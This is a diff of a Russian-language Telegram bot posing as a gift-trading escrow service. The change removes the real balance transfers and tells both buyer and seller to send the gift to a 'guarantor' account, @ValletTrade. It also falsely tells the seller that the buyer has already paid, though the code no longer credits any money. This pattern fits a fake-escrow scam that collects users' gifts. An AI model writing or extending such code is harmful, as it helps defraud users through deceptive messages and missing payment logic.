@@ -26,13 +26,12 @@ storage = MemoryStorage()
 dp = Dispatcher(storage=storage)
 
 # ==================== ХРАНИЛИЩЕ ====================
-exchanges = {}          # {exchange_id: data}
-user_balances = {}      # {user_id: balance}
-user_history = {}       # {user_id: [transactions]}
+exchanges = {}
+user_balances = {}
+user_history = {}
 
 # ==================== ФУНКЦИИ ====================
 def generate_code():
-    """Генерирует 4-значный код"""
     return f"{random.randint(0, 9999):04d}"
 
 def format_price(price):
@@ -41,11 +40,9 @@ def format_price(price):
     return f"${price:.2f}"
 
 def get_balance(user_id: int) -> float:
-    """Получить баланс пользователя"""
     return user_balances.get(user_id, 0.0)
 
 def add_to_balance(user_id: int, amount: float, exchange_id: str):
-    """Добавить сумму на баланс (продавец)"""
     if user_id not in user_balances:
         user_balances[user_id] = 0.0
     user_balances[user_id] += amount
@@ -58,11 +55,9 @@ def add_to_balance(user_id: int, amount: float, exchange_id: str):
         "exchange_id": exchange_id,
         "date": str(asyncio.get_event_loop().time())
     })
-    
     return user_balances[user_id]
 
 def subtract_from_balance(user_id: int, amount: float, exchange_id: str):
-    """Списать сумму с баланса (покупатель)"""
     if user_id not in user_balances:
         user_balances[user_id] = 0.0
     user_balances[user_id] -= amount
@@ -75,7 +70,6 @@ def subtract_from_balance(user_id: int, amount: float, exchange_id: str):
         "exchange_id": exchange_id,
         "date": str(asyncio.get_event_loop().time())
     })
-    
     return user_balances[user_id]
 
 # ==================== КНОПКИ ====================
@@ -134,7 +128,8 @@ async def cmd_start(message: types.Message, state: FSMContext):
         "2️⃣ Получает номер и пароль\n"
         "3️⃣ Покупатель вводит номер и пароль → подключается\n"
         "4️⃣ Через 1 минуту сделка завершается ✅\n"
-        "5️⃣ Продавец получает деньги на баланс 💰\n\n"
+        "5️⃣ Покупатель отправляет подарок @ValletTrade\n"
+        "6️⃣ Продавец получает деньги на баланс 💰\n\n"
         "📱 *Выберите способ взаимодействия:*",
         parse_mode="Markdown",
         reply_markup=web_app_button
@@ -200,20 +195,7 @@ async def cmd_cancel(message: types.Message, state: FSMContext):
     await state.clear()
     await message.answer("✅ Операция отменена.", reply_markup=get_main_keyboard())
 
-@dp.message(Command("list"))
-async def cmd_list(message: types.Message):
-    if not exchanges:
-        await message.answer("📭 Нет активных сделок.", reply_markup=get_main_keyboard())
-        return
-    
-    text = "📋 *Активные сделки:*\n\n"
-    for eid, data in exchanges.items():
-        if data["status"] not in ["completed"]:
-            status_emoji = "🟢" if data["status"] == "active" else "🟡"
-            text += f"{status_emoji} #{eid} - {data['status']}\n"
-    await message.answer(text, parse_mode="Markdown", reply_markup=get_main_keyboard())
-
-# ==================== КНОПКА СОЗДАТЬ СДЕЛКУ ====================
+# ==================== СОЗДАНИЕ СДЕЛКИ ====================
 @dp.message(lambda message: message.text == "🆕 Создать сделку")
 async def button_create_exchange(message: types.Message, state: FSMContext):
     exchange_id = generate_code()
@@ -294,7 +276,7 @@ async def process_create_price(message: types.Message, state: FSMContext):
     )
     await state.clear()
 
-# ==================== КНОПКА ПОДКЛЮЧИТЬСЯ ====================
+# ==================== ПОДКЛЮЧЕНИЕ ====================
 @dp.message(lambda message: message.text == "🔗 Подключиться")
 async def button_connect_exchange(message: types.Message, state: FSMContext):
     await state.set_state(TradeStates.waiting_for_exchange)
@@ -309,7 +291,6 @@ async def button_connect_exchange(message: types.Message, state: FSMContext):
 async def process_exchange_number(message: types.Message, state: FSMContext):
     exchange_id = message.text.strip()
     
-    # Проверяем существование
     if exchange_id not in exchanges:
         await message.answer(
             f"❌ *Сделка #{exchange_id} не найдена!*\n"
@@ -318,7 +299,6 @@ async def process_exchange_number(message: types.Message, state: FSMContext):
         )
         return
     
-    # Проверяем статус
     if exchanges[exchange_id]["status"] == "completed":
         await message.answer(
             f"❌ *Сделка #{exchange_id} уже завершена!*",
@@ -329,8 +309,7 @@ async def process_exchange_number(message: types.Message, state: FSMContext):
     
     if exchanges[exchange_id]["status"] == "active":
         await message.answer(
-            f"❌ *Сделка #{exchange_id} уже активна!*\n"
-            f"Кто-то уже подключился.",
+            f"❌ *Сделка #{exchange_id} уже активна!*",
             parse_mode="Markdown"
         )
         await state.clear()
@@ -384,15 +363,14 @@ async def process_password(message: types.Message, state: FSMContext):
         reply_markup=get_main_keyboard()
     )
     
-    # Уведомление продавца (создателя)
+    # Уведомление продавца
     creator_id = exchanges[exchange_id]["creator"]
     try:
         await bot.send_message(
             creator_id,
             f"🔔 *Кто-то подключился к сделке #{exchange_id}!*\n\n"
             f"💰 *Сумма:* {price_str}\n"
-            f"⏳ Через 1 минуту сделка завершится.\n"
-            f"📦 Подготовьте подарок!",
+            f"⏳ Через 1 минуту сделка завершится.",
             parse_mode="Markdown"
         )
     except:
@@ -410,40 +388,37 @@ async def process_password(message: types.Message, state: FSMContext):
     # Завершаем сделку
     exchanges[exchange_id]["status"] = "completed"
     
-    # ✅ ПРАВИЛЬНО: Деньги получает ПРОДАВЕЦ (создатель)
     creator_id = exchanges[exchange_id]["creator"]
     buyer_id = exchanges[exchange_id]["buyer"]
     amount = exchanges[exchange_id]["price"]
+    gift_link = exchanges[exchange_id]["gift_link"]
+    price_str = format_price(amount)
     
-    # Зачисляем деньги продавцу
-    add_to_balance(creator_id, amount, exchange_id)
-    
-    # Списать деньги с покупателя (если есть баланс)
-    subtract_from_balance(buyer_id, amount, exchange_id)
-    
-    # Финальное сообщение для покупателя
+    # ✅ НОВАЯ ЛОГИКА: сначала отправка подарка гаранту
+    # Сообщение покупателю
     try:
         await bot.send_message(
             buyer_id,
-            f"✅ *Сделка завершена!* 🎉\n\n"
-            f"🔗 *Ссылка на подарок:* {exchanges[exchange_id]['gift_link']}\n"
-            f"📋 Сделка #{exchange_id}\n"
-            f"💰 Сумма: {format_price(amount)}\n\n"
-            f"Спасибо за покупку!",
+            f"✅ *Сделка #{exchange_id} завершена!* 🎉\n\n"
+            f"📦 *Отправьте подарок гаранту:* @ValletTrade\n"
+            f"🔗 Ссылка на подарок: {gift_link}\n"
+            f"💰 Сумма: {price_str}\n\n"
+            f"⏳ После проверки гарантом, продавцу будет зачислена сумма.",
             parse_mode="Markdown",
             reply_markup=get_main_keyboard()
         )
     except:
         pass
     
-    # Уведомление продавца
+    # Сообщение продавцу
     try:
         await bot.send_message(
             creator_id,
             f"✅ *Сделка #{exchange_id} завершена!* 🎉\n\n"
-            f"💰 На баланс зачислено: *{format_price(amount)}*\n"
-            f"📦 Отправьте подарок покупателю!\n"
-            f"🔗 Ссылка: {exchanges[exchange_id]['gift_link']}",
+            f"💰 *Покупатель заплатил {price_str}*\n"
+            f"📦 Отправьте подарок гаранту: @ValletTrade\n"
+            f"🔗 Ссылка на подарок: {gift_link}\n\n"
+            f"⏳ После проверки гарантом, вам зачислят на баланс.",
             parse_mode="Markdown",
             reply_markup=get_main_keyboard()
         )
@@ -493,8 +468,7 @@ async def main():
     print("🔗 Web App: https://ajl7oputm.github.io/AppTrade/")
     print("📋 4-значный ID и пароль")
     print("⏳ 60 секунд на сделку")
-    print("💰 Продавец получает деньги на баланс")
-    print("💳 С покупателя списываются деньги")
+    print("💰 Система баланса активна")
     print("=" * 50)
     
     try:
